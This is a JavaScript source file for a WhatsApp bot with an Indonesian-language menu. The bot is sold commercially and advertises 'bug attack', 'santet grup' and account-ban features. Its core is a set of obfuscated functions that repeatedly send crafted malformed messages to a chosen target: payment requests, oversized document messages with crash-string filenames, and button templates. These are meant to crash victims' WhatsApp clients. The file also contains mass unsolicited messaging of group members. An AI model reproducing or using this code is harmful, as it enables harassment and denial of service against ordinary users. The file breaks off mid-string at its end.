require('../settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./lib/functions')
const { buttonvirus } = require('./lib/buttonvirus')
const { konf } = require('./lib/konf')
const { vnolim } = require('./lib/vnolim')

const addusrp = JSON.parse(fs.readFileSync('./nodeJS/database/user.json'))
const bugchat = JSON.parse(fs.readFileSync('./nodeJS/database/akses.json'))
const linsown = JSON.parse(fs.readFileSync('./nodeJS/database/lins.json'))
const linsadm = JSON.parse(fs.readFileSync('./nodeJS/database/admin.json'))

module.exports = nabil = async (nabil, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await nabil.decodeJid(nabil.user.id)
const isDeveloper = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMeLexx = [botNumber, ...global.bugrup].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAkses = [botNumber, ...bugchat].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const islinson = [botNumber, ...linsown].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const islinsad = [botNumber, ...linsadm].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)

const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await nabil.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const sender = m.key.fromMe ? (nabil.user.id.split(':')[0]+'@s.whatsapp.net' || nabil.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isQuotedMsg = (type == 'extendedTextMessage')

if (!nabil.public) {
if (!m.key.fromMe) return
}
const sticWait = () => {
let ano = fs.readFileSync('./wait.webp')
nabil.sendMessage(from, { sticker: ano }, { quoted: msg })
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
	
try {
ppuser = await nabil.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = nabil.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = nabil.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const createPassword = (size) => {
return crypto.randomBytes(size).toString('hex').slice(sender, size)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const reply = (teks) => {
nabil.sendMessage(m.chat, { text: teks }, { quoted: m })
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

let fakelex = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${runtime(process.uptime())}`, jpegThumbnail: ppnyauser}}}

const cpimage = async (caption) => {
nabil.sendMessage(from,{text:caption},{quoted:fakelex})
}

// My Function Send/Ngirim Bug
// Bang Kok Di Enc? Ya Serah Gua

const sendviewOnce = async (target) => {
function _0x5869(_0x665b28,_0x2b0882){var _0x222ce3=_0x222c();return _0x5869=function(_0x5869dd,_0x2a475f){_0x5869dd=_0x5869dd-0xb4;var _0xd796b2=_0x222ce3[_0x5869dd];return _0xd796b2;},_0x5869(_0x665b28,_0x2b0882);}var _0x1b9d30=_0x5869;(function(_0x1fdb73,_0x3b81c3){var _0x2b49e4=_0x5869,_0x72a0f3=_0x1fdb73();while(!![]){try{var _0x411106=-parseInt(_0x2b49e4(0xb6))/0x1*(parseInt(_0x2b49e4(0xbb))/0x2)+parseInt(_0x2b49e4(0xbd))/0x3+-parseInt(_0x2b49e4(0xb4))/0x4*(parseInt(_0x2b49e4(0xb7))/0x5)+-parseInt(_0x2b49e4(0xbc))/0x6+-parseInt(_0x2b49e4(0xba))/0x7+parseInt(_0x2b49e4(0xb8))/0x8+-parseInt(_0x2b49e4(0xb5))/0x9*(-parseInt(_0x2b49e4(0xbe))/0xa);if(_0x411106===_0x3b81c3)break;else _0x72a0f3['push'](_0x72a0f3['shift']());}catch(_0x303be1){_0x72a0f3['push'](_0x72a0f3['shift']());}}}(_0x222c,0xa3f4d),nabil[_0x1b9d30(0xb9)](target,{'image':{'url':'https://telegra.ph/file/6b22a2b9fe6577371a9b1.jpg'},'viewOnce':!![],'caption':'*I-LOVEYOU*'}));function _0x222c(){var _0x5dec1a=['8nugRwQ','3306480rgHVji','1250889aevEli','36715060pgwwJS','8MTHFWW','9sfvJDF','277316fRuvCX','1870795XdYidz','367768zxcyZx','sendMessage','7379491oUKgUH'];_0x222c=function(){return _0x5dec1a;};return _0x222c();}
}

const sendBugPay = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
var _0x2e715d=_0x3c82;function _0x30f5(){var _0x288deb=['1525674pJRrjN','fromObject','27oiFTQG','8650BwxgMR','1338KdgarU','259xVkelf','My\x20Developer\x20Bot','relayMessage','289940WBSCVJ','402276WkgNmu','3531140GNBCwL','IDR','key','Message','message','54512XuINjx','1246756azfJEY','100'];_0x30f5=function(){return _0x288deb;};return _0x30f5();}(function(_0x537bc6,_0x127fd8){var _0x5f48a1=_0x3c82,_0x1a526f=_0x537bc6();while(!![]){try{var _0x532f04=parseInt(_0x5f48a1(0x125))/0x1+parseInt(_0x5f48a1(0x11b))/0x2+parseInt(_0x5f48a1(0x11d))/0x3+parseInt(_0x5f48a1(0x126))/0x4+-parseInt(_0x5f48a1(0x120))/0x5*(parseInt(_0x5f48a1(0x121))/0x6)+parseInt(_0x5f48a1(0x122))/0x7*(parseInt(_0x5f48a1(0x11a))/0x8)+-parseInt(_0x5f48a1(0x11f))/0x9*(parseInt(_0x5f48a1(0x127))/0xa);if(_0x532f04===_0x127fd8)break;else _0x1a526f['push'](_0x1a526f['shift']());}catch(_0x3fc7ce){_0x1a526f['push'](_0x1a526f['shift']());}}}(_0x30f5,0x506d7));function _0x3c82(_0x477634,_0x557625){var _0x30f519=_0x30f5();return _0x3c82=function(_0x3c8201,_0x2a1f15){_0x3c8201=_0x3c8201-0x116;var _0x4579de=_0x30f519[_0x3c8201];return _0x4579de;},_0x3c82(_0x477634,_0x557625);}var requestPaymentMessage=generateWAMessageFromContent(from,proto[_0x2e715d(0x118)][_0x2e715d(0x11e)]({'requestPaymentMessage':{'currencyCodeIso4217':_0x2e715d(0x116),'amount1000':_0x2e715d(0x11c),'extendedTextMessage':{'text':_0x2e715d(0x123)}}}),{'userJid':from,'quoted':m});nabil[_0x2e715d(0x124)](target,requestPaymentMessage[_0x2e715d(0x119)],{'messageId':requestPaymentMessage[_0x2e715d(0x117)]['id']});
}}

const sendDocu = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
var _0x35b755=_0x5b5e;function _0x30e2(){var _0x29826a=['8845047rEDDKt','8ACufjH','2694332KOsaKB','Message','/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20','.jpeg','9043188uVNrMr','303093VEjdZf','2507532lAmIkI','309314EcocgP','4MhBEXo','SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=','\x0a\x0a\x0a\x0a','5946080qHaasR','𝐋𝐞𝐱𝐱𝐲𝐓𝐳𝐲𝐇𝐞𝐧𝐠𝐤𝐞𝐫𝐏𝐫𝐨𝐅𝐅📄\x0a\x0a\x0a','1658703206','https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc','5VCyixt','47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=','relayMessage','CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY='];_0x30e2=function(){return _0x29826a;};return _0x30e2();}(function(_0xcf3f3f,_0x109a59){var _0x1df655=_0x5b5e,_0x25521a=_0xcf3f3f();while(!![]){try{var _0x3421d0=parseInt(_0x1df655(0x1d2))/0x1*(parseInt(_0x1df655(0x1d3))/0x2)+parseInt(_0x1df655(0x1d1))/0x3+-parseInt(_0x1df655(0x1e0))/0x4*(parseInt(_0x1df655(0x1da))/0x5)+-parseInt(_0x1df655(0x1cf))/0x6+parseInt(_0x1df655(0x1d0))/0x7+-parseInt(_0x1df655(0x1df))/0x8*(-parseInt(_0x1df655(0x1de))/0x9)+parseInt(_0x1df655(0x1d6))/0xa;if(_0x3421d0===_0x109a59)break;else _0x25521a['push'](_0x25521a['shift']());}catch(_0x1fa0c7){_0x25521a['push'](_0x25521a['shift']());}}}(_0x30e2,0xda5ad));function _0x5b5e(_0x21e490,_0x1f0af9){var _0x30e288=_0x30e2();return _0x5b5e=function(_0x5b5ebf,_0x576119){_0x5b5ebf=_0x5b5ebf-0x1cf;var _0x39386f=_0x30e288[_0x5b5ebf];return _0x39386f;},_0x5b5e(_0x21e490,_0x1f0af9);}var document=generateWAMessageFromContent(target,proto[_0x35b755(0x1e1)]['fromObject']({'documentMessage':{'url':_0x35b755(0x1d9),'mimetype':'','title':'𝗕𝗔𝗦𝗘\x20𝗦𝗜𝗗','fileSha256':_0x35b755(0x1db),'pageCount':0xf4240,'mediaKey':_0x35b755(0x1d4),'fileName':_0x35b755(0x1d7)+konf+_0x35b755(0x1d5)+vnolim+_0x35b755(0x1e3),'fileEncSha256':_0x35b755(0x1dd),'directPath':_0x35b755(0x1e2),'mediaKeyTimestamp':_0x35b755(0x1d8)}}),{'userJid':target});nabil[_0x35b755(0x1dc)](target,document['message'],{'messageId':document['key']['id']});
}}

// button 6
const sendBug = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
function _0x25a9(_0x1cc8b8,_0x5aac84){var _0x352cce=_0x352c();return _0x25a9=function(_0x25a9fd,_0x4c1b7b){_0x25a9fd=_0x25a9fd-0x181;var _0x281b4f=_0x352cce[_0x25a9fd];return _0x281b4f;},_0x25a9(_0x1cc8b8,_0x5aac84);}function _0x352c(){var _0x3c9256=['228ZxWzkJ','21848gjWzqY','sendMessage','3996657yRrEmi','77036FHgyrY','112kmrzIf','16404LvLWEx','4116850hvVFsB','6jUuijK','42ixHQBP','https://www.whatsapp.com/otp/copy/','89930dsrhJN','7689exDDES','3896RRNCFL','https://wa.me/'];_0x352c=function(){return _0x3c9256;};return _0x352c();}var _0x480848=_0x25a9;(function(_0x101554,_0xda888){var _0x7489ed=_0x25a9,_0x8caef9=_0x101554();while(!![]){try{var _0x3725c3=parseInt(_0x7489ed(0x187))/0x1*(parseInt(_0x7489ed(0x183))/0x2)+-parseInt(_0x7489ed(0x18e))/0x3*(parseInt(_0x7489ed(0x18c))/0x4)+-parseInt(_0x7489ed(0x18a))/0x5*(-parseInt(_0x7489ed(0x188))/0x6)+-parseInt(_0x7489ed(0x184))/0x7*(-parseInt(_0x7489ed(0x18f))/0x8)+parseInt(_0x7489ed(0x182))/0x9+parseInt(_0x7489ed(0x186))/0xa+-parseInt(_0x7489ed(0x18b))/0xb*(parseInt(_0x7489ed(0x185))/0xc);if(_0x3725c3===_0xda888)break;else _0x8caef9['push'](_0x8caef9['shift']());}catch(_0x340ffe){_0x8caef9['push'](_0x8caef9['shift']());}}}(_0x352c,0x3765b),nabil[_0x480848(0x181)](target,{'text':'','templateButtons':[{'callButton':{'displayText':'Hi','phoneNumber':''}},{'urlButton':{'displayText':'Hi','url':_0x480848(0x18d)}},{'urlButton':{'displayText':'Hi','url':_0x480848(0x189)}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}}]}));
}}

//Rumgc
const sendBuggc = async (rumgc,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
function _0x25a9(_0x1cc8b8,_0x5aac84){var _0x352cce=_0x352c();return _0x25a9=function(_0x25a9fd,_0x4c1b7b){_0x25a9fd=_0x25a9fd-0x181;var _0x281b4f=_0x352cce[_0x25a9fd];return _0x281b4f;},_0x25a9(_0x1cc8b8,_0x5aac84);}function _0x352c(){var _0x3c9256=['228ZxWzkJ','21848gjWzqY','sendMessage','3996657yRrEmi','77036FHgyrY','112kmrzIf','16404LvLWEx','4116850hvVFsB','6jUuijK','42ixHQBP','https://www.whatsapp.com/otp/copy/','89930dsrhJN','7689exDDES','3896RRNCFL','https://wa.me/'];_0x352c=function(){return _0x3c9256;};return _0x352c();}var _0x480848=_0x25a9;(function(_0x101554,_0xda888){var _0x7489ed=_0x25a9,_0x8caef9=_0x101554();while(!![]){try{var _0x3725c3=parseInt(_0x7489ed(0x187))/0x1*(parseInt(_0x7489ed(0x183))/0x2)+-parseInt(_0x7489ed(0x18e))/0x3*(parseInt(_0x7489ed(0x18c))/0x4)+-parseInt(_0x7489ed(0x18a))/0x5*(-parseInt(_0x7489ed(0x188))/0x6)+-parseInt(_0x7489ed(0x184))/0x7*(-parseInt(_0x7489ed(0x18f))/0x8)+parseInt(_0x7489ed(0x182))/0x9+parseInt(_0x7489ed(0x186))/0xa+-parseInt(_0x7489ed(0x18b))/0xb*(parseInt(_0x7489ed(0x185))/0xc);if(_0x3725c3===_0xda888)break;else _0x8caef9['push'](_0x8caef9['shift']());}catch(_0x340ffe){_0x8caef9['push'](_0x8caef9['shift']());}}}(_0x352c,0x3765b),nabil[_0x480848(0x181)](rumgc,{'text':'','templateButtons':[{'callButton':{'displayText':'Hi','phoneNumber':''}},{'urlButton':{'displayText':'Hi','url':_0x480848(0x18d)}},{'urlButton':{'displayText':'Hi','url':_0x480848(0x189)}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}}]}));
}}


// buttons 9
const sendBug2 = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
function _0x568a(_0x1c3932,_0x4b467a){var _0x3376d5=_0x3376();return _0x568a=function(_0x568ad1,_0x28c36f){_0x568ad1=_0x568ad1-0xe5;var _0xec5b0f=_0x3376d5[_0x568ad1];return _0xec5b0f;},_0x568a(_0x1c3932,_0x4b467a);}function _0x3376(){var _0x20ec8f=['1355613mhPOfS','10LsOhsx','9CQXOOY','671215ZmLtAS','624126qwoJUE','4fzeFeM','14880890OlFEyJ','9453880jXMrTv','628002KzocTG','1272255ocFWLQ'];_0x3376=function(){return _0x20ec8f;};return _0x3376();}(function(_0x17de0e,_0x7cd796){var _0x38a030=_0x568a,_0x39739e=_0x17de0e();while(!![]){try{var _0x1db320=-parseInt(_0x38a030(0xe9))/0x1+parseInt(_0x38a030(0xe7))/0x2*(parseInt(_0x38a030(0xee))/0x3)+parseInt(_0x38a030(0xeb))/0x4*(parseInt(_0x38a030(0xe5))/0x5)+parseInt(_0x38a030(0xea))/0x6+parseInt(_0x38a030(0xe6))/0x7+parseInt(_0x38a030(0xed))/0x8*(parseInt(_0x38a030(0xe8))/0x9)+-parseInt(_0x38a030(0xec))/0xa;if(_0x1db320===_0x7cd796)break;else _0x39739e['push'](_0x39739e['shift']());}catch(_0x3bc3ea){_0x39739e['push'](_0x39739e['shift']());}}}(_0x3376,0x97ab0),nabil['sendMessage'](target,{'text':'','templateButtons':[{'callButton':{'displayText':'Hi','phoneNumber':''}},{'callButton':{'displayText':'Hi','phoneNumber':''}},{'urlButton':{'displayText':'Hi','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}}]}));
}}

if (command) {
nabil.readMessages([m.key])
}

const textbugmenu =` 
         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *MENU* 〕
││
│┝・lins
│┝・bugmenu
│┝・nabil
│┗─────────────━
╰────────────────❍
`
switch (command) {
case 'nabil':
case 'bugmenu':
case 'lins':{
let jiren = '62895622182398@s.whatsapp.net'
mentions(`Halo Kak ${m.pushName} jika ada fitur yang eror silahkan hubungi soheh official trmksh >_<


  ╭─────────━
┏┤›› *Creator Info*
│┝・Developer : SOHEH OFFICIAL 🔥
│┝・Bot Name : Soheh Botz
│┝・Contac : @${jiren.split('@')[0]}
│┝・Version : 4.0.0
│┝・Runnung : Panel Only
│┝・Socia : https://sociabuzz.com/bot_wa
│┗─────────────━
╰────────────────❍


         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *MENU DEVELOPER* 〕
││
│┝・addusr
│┝・delusr
│┝・listusr
│┝・addown
│┝・delown
│┝・listown
│┝・addatmin
│┝・delatmin
│┝・listatmin
│┝・pushkontak
│┝・linspush
│┝・listgc
│┗─────────────━
╰────────────────❍

         /)   /)  ❀ 
       („• ֊ •„)      
  ╭─O─O──────────
┏┤››〔 *MENU OWNER* 〕
││
│┝・unbanwa
│┝・unbanned
│┝・linsout 
│┝・linsban
│┝・out 
│┝・verify
│┝・kenon 
│┝・resetotp
│┝・banned 
│┝・linsgas 
│┝・linsallin 
│┝・linsv1 
│┝・linsv2 
│┝・linspay 
│┗─────────────━
╰────────────────❍
         /)   /)  ❀ 
       („• ֊ •„)      
  ╭─O─O──────────
┏┤››〔 *MENU ATMIN* 〕
││
│┝・promote
│┝・demote
│┝・kick
│┝・grup on/off
│┝・hidetag
│┝・revoke
│┝・linkgrup
│┝・addusr
│┝・delusr
│┝・listusr
│┝・verif
│┝・kenonwa
│┝・matiwa
│┝・keluarwa
│┝・linsgc
│┝・bomgc
│┝・buggc
│┝・trolgc
│┝・santetgc
│┗─────────────━
╰────────────────❍

         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *MAIN MENU* 〕
││
│┝・allpay 
│┝・buysc
│┝・bot
│┝・owner 
│┝・runtime 
│┝・joinadmin   
│┝・joinown 
│┝・buyakses 
│┝・sewa
│┝・jadibot
│┝・menfes
│┝・confes
│┗─────────────━
╰────────────────❍

         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *BUG EMOJI* 〕
││
│┝・🐼
│┝・🐨
│┝・🐻
│┝・🐣
│┝・🐤
│┝・🐥
│┝・🐦
│┝・🐧
│┝・🦤
│┝・🦩
│┝・🦆
│┗─────────────━
╰────────────────❍

         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *BUG ATTACK* 〕
││
│┝・santet
│┝・dark
│┝・troli
│┝・trava
│┝・ganas
│┝・hard
│┝・turu
│┝・bom
│┝・bugchat
│┝・santetpc
│┝・bugpc
│┝・crash
│┝・mati
│┝・mampus
│┝・nabilgas
│┝・tururiper
│┝・slayer
│┝・virus
│┝・virdok
│┗─────────────━
╰────────────────❍

         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *BUG VERIFY* 〕
││
│┝・out 
│┝・verify
│┝・kenon 
│┝・resetotp
│┝・banned 
│┝・verif
│┝・matiwa
│┝・keluarwa
│┝・kenonwa
│┗─────────────━
╰────────────────❍

         /)   /)  ❀ 
       („• ֊ •„)   
  ╭─O─O──────────
┏┤››〔 *SANTET GRUP* 〕
││
│┝・linsgc
│┝・bomgc
│┝・buggc
│┝・trolgc
│┝・santetgc
│┗─────────────━
╰────────────────❍

❝ Bug hanya tembus kepada pengguna gb whatsapp atau whatsapp ori versi lama,,Bug yang tembus semua whatsapp hanya ada di menu owner minat jadi owner? ketik joinown ❞`,[jiren])
}
break
case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!q) return reply(`*Cara Penggunaan*\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62895622182398|Secret|I have a crush on you\n\n\nTenang saja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return msg.reply(`Harus di isi semua! ex : menfess 62895622182398|secret|hallo min`)
				 let teksnya = `Assalamualaikum kak ada Menfess nih!!\n─────────────\nCreated by instagram.com/rijalsavior\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://telegra.ph/file/8ec5b6f37f4bd8dba3d05.jpg`
					nabil.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://telegra.ph/file/8ec5b6f37f4bd8dba3d05.jpg`}, footer: `Ciee ada yang ngirim pesan nih\nJangan lupa bales pesannya ya` })
				reply(`Sukses Mengirim Menfess!!`)
				break

//PUSH KONTAK
case "pushkontak":{
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${command} idgc,tekspushkontak`)
const metadata2 = await nabil.groupMetadata(q.split(",")[0])
const halss = metadata2.participants
reply(`Succes get member,,silahkan tunggu`)
for (let mem of halss) {
nabil.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split(",")[1] })
await sleep(10000)
}
reply(`Push kontak selesai!!`)
}
break
case 'linspush': {
  if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
if (!q) return reply(`textnya mana?`)
  let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
  reply(`Succes get member,,silahkan tunggu`)
  for (let i = 0; i < mem.length; i++) {
    nabil.sendMessage(mem[i], { text: q})
    await new Promise(resolve => setTimeout(resolve, 10000)) // Delay 30 detik interval 10000ms
  }
  reply(`Push kontak selesai!!`)
}
break
case "listgc": {
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
let getGroups = await nabil.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP ANDA*\n\nTotal Group : ${anu.length} GROUP\n\n`
for (let x of anu) {
let metadata2 = await nabil.groupMetadata(x)
teks += `❏  ${metadata2.subject}\n┠─ *ID :* ${metadata2.id}\n┠─ *STATUS :* GROUP\n╰────| ANGGOTA : ${metadata2.participants.length}\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik\nCommand ${prefix}nabil.id\n\n\n *© nabil.ID*`)
}
break


case 'linkgrup': case 'linkgc':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins && !islinsad) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
var url = await nabil.groupInviteCode(from).catch(() => reply('Maaf terjadi kesalahan'))
url = 'https://chat.whatsapp.com/'+url
reply(url)
}
break
case 'pay': case 'payment': case 'bayar': case 'pembayaran': case 'allpay': {
                nabil.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e7a305b5e20b8727d6da3.png' }, caption: `Hai Kak ${m.pushName} Selamat Belanja\n\n\nDANA: 0895622182398\nOVO:  0895622182398\nGOPAY:  0895622182398 \n\nNote: Membeli Berarti Tau Apa Yang Dibeli,Noreff` }, { quoted: m })
            }
            break
case 'buyakses':{
textakses = `
❍ LIST AKSES BOT ❍
┏━━⊱
┣❏ addakses 5k/bulan
┣❏ akses bot permanen 25k
┣❏ *Membeli Berarti Tau Apa Yang Di Beli*
┣❏ http://wa.me/62895622182398
┗━━⊱ nabil
`
reply(textakses)
}
break
case 'jadibot':{
textjadibot = `
❍ HARGA JADIBOT ❍
┏━━⊱
┣❏ Paket 1  Rp 30.000
┣❏ Paket 2  Rp 35.000
┣❏ Paket 3  Rp 45.000
┣❏ Paket 4  Rp 50.000
┗━━⊱ nabil
Harga Perpanjang Jadi Bot
┏━━⊱
┣❏ Paket1 Rp 20.000
┣❏ Paket2 Rp 25.000   
┣❏ Paket3 Rp.35.000 
┣❏ Paket4 Rp 40.000
┗━━⊱ 
Bang Kenapa Harganya Beda² ?
Beda Harga Beda kualitas 
Apasih Keuntungan Jadibot
1.Seting Nama,Nomor Owner dll
2.Bisa Open Sewa Bot
3.Milih Jadi Bot Sesuka Hati
4.On 24 Jam Tanpa Internet
5.Semua Tanggungan Admin
6.Mudah & Tidak Ribet

http://wa.me/62895622182398 (Owner)
`
reply(textjadibot)
}
break
case 'sewa':{
textsewa = `
❍ LIST SEWA ❍
